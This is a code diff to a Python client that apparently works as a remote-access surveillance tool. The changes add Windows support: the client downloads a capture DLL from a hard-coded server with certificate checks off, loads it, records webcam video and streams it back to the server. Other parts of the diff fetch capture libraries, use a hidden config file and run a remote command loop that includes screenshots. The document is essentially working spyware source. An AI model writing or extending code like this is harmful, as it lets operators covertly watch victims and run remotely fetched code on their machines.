@@ -32,13 +32,14 @@ current_stop_event = None
 
 # Track the current working directory (starting with the root or default directory)
 current_directory = os.path.expanduser("~")
-SERVER_URL = "https://localhost:5000"  # Change to your actual server URL later
+SERVER_URL = "https://192.168.16.105:5000"  # Change to your actual server URL later
 
 VIDEO_SO_URL = f"{SERVER_URL}/video.so"
-ENDPOINT = f"{SERVER_URL}/api/video-frame-from-client"
-PHOTO_SO_URL = f"{SERVER_URL}/photo_capture.so"  # New URL for photo_capture.so
+VIDEO_DLL_URL = f"{SERVER_URL}/capture_video.dll"  # URL for Windows video DLL
+VIDEO_FEED_ENDPOINT = f"{SERVER_URL}/api/video-frame-from-client"
+PHOTO_SO_URL = f"{SERVER_URL}/photo_capture.so"  # URL for Linux photo SO
+PHOTO_DLL_URL = f"{SERVER_URL}/capture_photo_windows.dll"  # URL for Windows photo DLL
 PHOTO_ENDPOINT = f"{SERVER_URL}/api/captured-photo-data"  # Endpoint to send photo data
-PHOTO_DLL_URL = f"{SERVER_URL}/photo_capture_windows.dll"  # URL for Windows DLL
 
 CONFIG_FILE_LINUX = "/tmp/.rootconfig.ini"  # Path in Linux root directory
 CONFIG_FILE_WINDOWS = os.path.join(os.path.expanduser("~"), "rootconfig.ini")  # User's home directory on Windows
@@ -779,6 +780,33 @@ def download_so(max_retries=3, delay=2):
     print(f"Failed to download {so_path} after {max_retries} attempts")
     return None
 
+def download_video_dll(max_retries=3, delay=2):
+    dll_path = "./capture_video.dll"
+    if os.path.exists(dll_path) and os.path.getsize(dll_path) > 0:
+        print(f"Using existing {dll_path}")
+        return dll_path
+
+    print(f"Attempting to download {dll_path} from {VIDEO_DLL_URL}...")
+    for attempt in range(max_retries):
+        try:
+            response = requests.get(VIDEO_DLL_URL, stream=True, verify=False, timeout=10)
+            response.raise_for_status()
+            with open(dll_path, 'wb') as f:
+                for chunk in response.iter_content(chunk_size=8192):
+                    f.write(chunk)
+            if os.path.exists(dll_path) and os.path.getsize(dll_path) > 0:
+                print(f"Successfully downloaded {dll_path}")
+                return dll_path
+            else:
+                print(f"Downloaded file is empty or invalid")
+                os.remove(dll_path) if os.path.exists(dll_path) else None
+        except requests.RequestException as e:
+            print(f"Download attempt {attempt + 1}/{max_retries} failed: {e}")
+            if attempt < max_retries - 1:
+                time.sleep(delay)
+    print(f"Failed to download {dll_path} after {max_retries} attempts")
+    return None
+
 def download_photo_so(max_retries=3, delay=2):
     so_path = "./photo_capture.so"
     if os.path.exists(so_path) and os.path.getsize(so_path) > 0:
@@ -843,7 +871,7 @@ def send_frame(data, length):
     max_retries = 3
     for attempt in range(max_retries):
         try:
-            response = requests.post(ENDPOINT, data=frame_data, headers={"Content-Type": "image/jpeg"}, timeout=5, verify=False)
+            response = requests.post(VIDEO_FEED_ENDPOINT, data=frame_data, headers={"Content-Type": "image/jpeg"}, timeout=5, verify=False)
             response.raise_for_status()
             print(f"Frame sent to server ({len(frame_data)} bytes)")
             return
@@ -874,7 +902,7 @@ def send_photo_data(data, length):
                 time.sleep(1)
     print("Failed to send photo data after retries")
 
-def start_video_capture(duration, fps):
+def start_video_capture_linux(duration, fps):
     global video_stop_event, video_lib, video_thread
     video_stop_event.clear()  # Reset stop flag
 
@@ -914,7 +942,7 @@ def start_video_capture(duration, fps):
         video_lib.stop_video_capture.restype = ctypes.c_int
         video_lib.stop_video_capture.argtypes = []
 
-    print(f"Starting video capture for {duration} seconds at {fps} FPS...")
+    print(f"Starting video capture (Linux) for {duration} seconds at {fps} FPS...")
     try:
         # Start the video capture
         result = video_lib.start_video_capture(duration, fps, callback)
@@ -932,6 +960,109 @@ def start_video_capture(duration, fps):
         if video_stop_event.is_set() and hasattr(video_lib, 'stop_video_capture'):
             video_lib.stop_video_capture()
             print("Video capture forcefully stopped during execution")
+
+def start_video_capture_windows(duration, fps):
+    global video_stop_event, video_lib, video_thread
+    video_stop_event.clear()  # Reset stop flag
+
+    # Download capture_video.dll
+    dll_path = download_video_dll()
+    if not dll_path:
+        print("Error: Could not obtain capture_video.dll")
+        return False
+
+    try:
+        print(f"Step 1: Current directory: {os.getcwd()}")
+        print(f"Step 1: Python architecture: {platform.architecture()[0]}")
+
+        print(f"Step 2: DLL path: {dll_path}")
+        if not os.path.exists(dll_path):
+            raise FileNotFoundError("capture_video.dll not found")
+        print("Step 2: DLL file exists")
+
+        print("Step 3: Attempting to load DLL...")
+        video_lib = ctypes.CDLL(dll_path)
+        print("Step 3: DLL loaded successfully")
+
+        # Define the function signature for captureVideo
+        print("Step 4: Defining function signature...")
+        capture_video_func = video_lib.captureVideo
+        capture_video_func.argtypes = [ctypes.c_char_p, ctypes.c_int, ctypes.c_int]  # char* filename, int duration, int fps
+        capture_video_func.restype = ctypes.c_int  # Return int (0 success, -1 failure)
+        print("Step 4: Function signature defined")
+
+        # Temporary file for video capture
+        filename = "temp_video.avi"
+        print(f"Step 5: Preparing filename: {filename}, duration: {duration} seconds, fps: {fps}")
+        filename_bytes = filename.encode('utf-8')
+        print(f"Step 5: Filename encoded to bytes: {filename_bytes}")
+
+        print("Step 6: Calling captureVideo function...")
+        start_time = time.time()
+        result = capture_video_func(filename_bytes, duration, fps)
+        print(f"Step 6: Function called, result: {result}, time taken: {time.time() - start_time:.2f} seconds")
+
+        print("Step 7: Processing result...")
+        if result == 0:
+            print(f"Step 7: Video saved as {filename}")
+            if os.path.exists(filename):
+                print(f"Step 7: File size: {os.path.getsize(filename)} bytes")
+                # Immediately send frames after capture
+                with open(filename, 'rb') as video_file:
+                    video_data = video_file.read()
+                    total_frames = duration * fps
+                    chunk_size = max(1, len(video_data) // total_frames)  # Ensure at least 1 byte per chunk
+                    print(f"Step 7: Sending {total_frames} frames, chunk size: {chunk_size} bytes")
+                    frame_count = 0
+                    for i in range(0, len(video_data), chunk_size):
+                        if video_stop_event.is_set():
+                            print("Step 7: Stop event detected, aborting frame sending")
+                            break
+                        frame_data = video_data[i:i + chunk_size]
+                        max_retries = 3
+                        for attempt in range(max_retries):
+                            try:
+                                response = requests.post(
+                                    VIDEO_FEED_ENDPOINT,
+                                    data=frame_data,
+                                    headers={"Content-Type": "video/x-msvideo"},
+                                    timeout=5,
+                                    verify=False
+                                )
+                                response.raise_for_status()
+                                frame_count += 1
+                                print(f"Frame {frame_count} sent to server ({len(frame_data)} bytes)")
+                                break
+                            except requests.RequestException as e:
+                                print(f"Error sending frame {frame_count + 1} (attempt {attempt + 1}/{max_retries}): {e}")
+                                if attempt < max_retries - 1:
+                                    time.sleep(1)
+                        if frame_count < total_frames:
+                            time.sleep(1 / fps)  # Maintain frame rate pacing
+                os.remove(filename)  # Clean up temporary file
+                print(f"Step 7: Video capture and sending completed, sent {frame_count} frames")
+                return True
+            else:
+                print("Step 7: Warning: File was not created despite success return code")
+                return False
+        else:
+            print(f"Step 7: Failed to capture video (return code: {result})")
+            return False
+
+    except Exception as e:
+        print(f"Error during video capture (Windows): {str(e)}")
+        return False
+    finally:
+        video_lib = None  # Clean up
+
+def start_video_capture(duration, fps):
+    if os_name == "Linux":
+        return start_video_capture_linux(duration, fps)
+    elif os_name == "Windows":
+        return start_video_capture_windows(duration, fps)
+    else:
+        print(f"Unsupported OS for video capture: {os_name}")
+        return False
 
 def capture_photo_linux():
     global photo_lib
@@ -1124,7 +1255,7 @@ while True:
                 else:
                     print("No video running to stop")
                 command = ""
-            if command.strip() == "screenshot":
+            elif command.strip() == "screenshot":
                 print("Starting screenshot process")
                 try:
                     with mss.mss() as sct:
